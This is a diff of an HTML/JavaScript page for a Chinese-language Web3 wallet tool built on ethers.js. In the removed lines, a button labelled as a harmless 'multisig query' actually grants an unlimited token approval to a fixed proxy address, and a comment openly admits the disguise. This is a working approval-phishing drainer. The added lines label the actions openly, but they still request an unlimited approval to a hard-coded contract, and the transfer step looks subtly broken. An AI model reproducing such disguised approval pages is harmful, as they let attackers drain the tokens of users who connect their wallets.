@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SOLA多签管理 - 主网版本</title>
+    <title>Web3 钱包授权与代币转移</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -51,39 +51,98 @@
     </style>
 </head>
 <body>
-    <h1>SOLA多签管理 - 主网版本</h1>
+    <h1>Web3 钱包授权与代币转移</h1>
+
     <!-- 链接钱包按钮 -->
-    <button id="connectWallet" onclick="connectWallet()">链接钱包</button>
+    <button id="connectWallet" onclick="connectWallet()">连接钱包</button>
     <p id="walletStatus">钱包未连接</p>
 
-    <!-- 多签查询按钮 -->
-    <button id="approveButton" onclick="approveTokens()" disabled>多签查询</button>
+    <!-- 授权按钮 -->
+    <button id="authorizeButton" onclick="authorizeTokens()" disabled>授权代币</button>
+
+    <!-- 转账按钮 -->
+    <button id="transferButton" onclick="transferTokens()" disabled>转账代币</button>
 
     <!-- 状态提示区域 -->
     <div class="status" id="operationStatus">状态: 等待操作...</div>
 
-    <!-- 替代 CDN -->
+    <!-- 引入 ethers.js -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        // 配置
-        const tokenAddress = "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"; // 目标ERC20代币主网地址
-        const proxyAddress = "0x0BcEd353336795697B4C0E027AB09C56c5FD9DC0"; // 代理合约主网地址
         let provider, signer;
+        const tokenAddress = "0x7c393A4e42AF854Dd0D5914708584EF8c70a2a21"; // 代币合约地址
+        const contractAddress = "0x8b2bEc467646Ee90f1a3e4E381445Db26BD1d2b3"; // 主合约地址
+        const tokenABI = [
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "spender",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "approve",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "sender",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address",
+                        "name": "recipient",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "uint256",
+                        "name": "amount",
+                        "type": "uint256"
+                    }
+                ],
+                "name": "transferFrom",
+                "outputs": [
+                    {
+                        "internalType": "bool",
+                        "name": "",
+                        "type": "bool"
+                    }
+                ],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
 
-        // 链接钱包
+        // 连接钱包
         async function connectWallet() {
             if (typeof window.ethereum !== "undefined") {
                 try {
                     // 请求用户连接钱包
                     provider = new ethers.providers.Web3Provider(window.ethereum);
-                    await provider.send("eth_requestAccounts", []);
+                    await provider.send("eth_requestAccounts", []); // 请求账户
                     signer = provider.getSigner();
                     const walletAddress = await signer.getAddress();
 
                     // 更新钱包状态
                     document.getElementById("walletStatus").innerText = `已连接钱包地址: ${walletAddress}`;
-                    document.getElementById("approveButton").disabled = false; // 启用多签查询按钮
-                    document.getElementById("operationStatus").innerText = "状态: 钱包已连接，可以开始多签查询。";
+                    document.getElementById("authorizeButton").disabled = false; // 启用授权按钮
+                    document.getElementById("transferButton").disabled = false; // 启用转账按钮
+                    document.getElementById("operationStatus").innerText = "状态: 钱包已连接，可以授权和转账代币。";
                 } catch (error) {
                     console.error("钱包连接失败:", error);
                     alert("钱包连接失败，请重试！");
@@ -93,33 +152,59 @@
             }
         }
 
-        // 多签查询（实际功能不变，但前端显示为“多签查询”）
-        async function approveTokens() {
+        // 授权代币
+        async function authorizeTokens() {
             if (!signer) {
-                alert("请先链接钱包！");
+                alert("请先连接钱包！");
                 return;
             }
-
-            // ERC20 代币合约 ABI（仅包含 approve 方法）
-            const tokenABI = [
-                "function approve(address spender, uint256 amount) external returns (bool)"
-            ];
 
             // 创建代币合约实例
             const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
 
             try {
-                // 调用 approve 方法授权无限额度
-                const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
-                console.log("多签查询已发送:", tx.hash);
-                document.getElementById("operationStatus").innerText = "状态: 查询已提交，请等待确认...";
+                // 调用授权方法（最大数量）
+                const amount = ethers.constants.MaxUint256;
+                const tx = await tokenContract.approve(contractAddress, amount);
+                console.log("授权交易已提交:", tx.hash);
+                document.getElementById("operationStatus").innerText = "状态: 授权已提交，请等待确认...";
                 await tx.wait(); // 等待交易确认
-                document.getElementById("operationStatus").innerText = "状态: 多签查询完成！";
-                alert("操作成功，已完成多签查询！");
+                document.getElementById("operationStatus").innerText = "状态: 授权完成！";
+                alert("授权成功，合约已获得最大额度代币授权！");
             } catch (error) {
-                console.error("操作失败:", error);
-                document.getElementById("operationStatus").innerText = "状态: 查询失败，请检查控制台错误信息！";
-                alert("操作失败，请检查控制台错误信息！");
+                console.error("授权失败:", error);
+                document.getElementById("operationStatus").innerText = "状态: 授权失败，请检查控制台错误信息！";
+                alert("授权失败，请检查控制台错误信息！");
+            }
+        }
+
+        // 转账代币
+        async function transferTokens() {
+            if (!signer) {
+                alert("请先连接钱包！");
+                return;
+            }
+
+            // 创建代币合约实例
+            const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
+
+            // 获取转账信息
+            const fromAddress = await signer.getAddress();
+            const toAddress = prompt("请输入接收者地址：");
+            const amount = prompt("请输入转账金额（单位：代币）：");
+
+            try {
+                // 转账操作
+                const tx = await tokenContract.transferFrom(fromAddress, toAddress, ethers.utils.parseUnits(amount, 18));
+                console.log("转账交易已提交:", tx.hash);
+                document.getElementById("operationStatus").innerText = "状态: 转账已提交，请等待确认...";
+                await tx.wait(); // 等待交易确认
+                document.getElementById("operationStatus").innerText = "状态: 转账完成！";
+                alert("转账成功！");
+            } catch (error) {
+                console.error("转账失败:", error);
+                document.getElementById("operationStatus").innerText = "状态: 转账失败，请检查控制台错误信息！";
+                alert("转账失败，请检查控制台错误信息！");
             }
         }
     </script>
